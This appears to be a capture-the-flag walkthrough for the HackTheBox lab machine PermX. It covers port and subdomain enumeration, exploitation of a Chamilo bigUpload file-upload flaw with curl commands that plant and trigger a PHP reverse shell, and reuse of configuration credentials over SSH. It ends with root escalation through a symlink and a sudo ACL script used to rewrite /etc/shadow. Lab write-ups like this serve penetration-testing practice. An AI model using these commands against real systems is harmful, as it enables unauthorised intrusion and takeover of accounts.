**Ping**
![[Pasted image 20240708134243.png]]

Nmap Scans
```
mapit 10.10.11.23
```

Nmap Default Scan
![[Pasted image 20240708134345.png]]

Nmap Service and Script Scan
![[Pasted image 20240708134548.png]]

Nmap All Port Scan
![[Pasted image 20240708134600.png]]

Nmap Service and Script Scan for new Ports
![[Pasted image 20240708134628.png]]
![[Pasted image 20240708134643.png]]


Added permx.htb to my hosts file
![[Pasted image 20240708134833.png]]

On Port 80
![[Pasted image 20240708134901.png]]

MYSQL Enum
```
mysql -h 10.10.11.23 -u root -P 3307
```
![[Pasted image 20240708135337.png]]

Will enumerate Sub Domains
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18
```
![[Pasted image 20240708182238.png]]
So we have an another domain http://lms.permx.htb

Gobuster scan for lms
```
gobuster dir -u http://lms.permx.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster_lms.txt
```
![[Pasted image 20240708183107.png]]
On http://lms.permx.htb/robots.txt
![[Pasted image 20240708183048.png]]

After a lot of enumeration Found the website is vulnerable to bigupload https://starlabs.sg/advisories/23/23-4220/




Now Will Jump to Initial Foothold.....!

Will upload the revere shell file and trigger it to get a shell
```
curl -F 'bigUploadFile=@rev.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```
```
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
```
![[Pasted image 20240708191514.png]]

Got shell as www-data
![[Pasted image 20240708191611.png]]

Don't have perm to open user mtz directory 
![[Pasted image 20240708191656.png]]
Will check for any creds in config files

Found one on /var/www/chamilo/app/configuration.php/
![[Pasted image 20240708191826.png]]

Though we have db creds, there no useful Info in db, We have ssh and known user mtz
Will use the password to the user mtz

SSH session as mtz
```
ssh mtz@permx.htb
```
![[Pasted image 20240708192144.png]]
Got it.....!

User.txt
![[Pasted image 20240708193557.png]]

Will Jump to Privilege Escalation.....!

Will check our privileges
```
sudo -l
```
![[Pasted image 20240708192324.png]]
We can execute the file acl.sh as root without password, will check it permission

Permissions of acl.sh
```
ls -la /opt/acl.sh
```
![[Pasted image 20240708192450.png]]
We don't have write Permission, will check the script.

This code change the permissions of a file ACL, will Elevate our privileges to root using this Script.

First will create a symlink in your home directory that points to a /etc/shadow file
```
ln -s / pwned
```

Then change it permission
```
sudo /opt/acl.sh mtz rwx /home/mtz/pwned/etc/shadow
```

Changing the root password to pwned
```
openssl passwd pwned
```

Now we can edit the shadow file
![[Pasted image 20240708195043.png]]
I have changed root password, will switch to root now

**Root.txt**
```
su
```
![[Pasted image 20240708195203.png]]



Done with PermX....:)



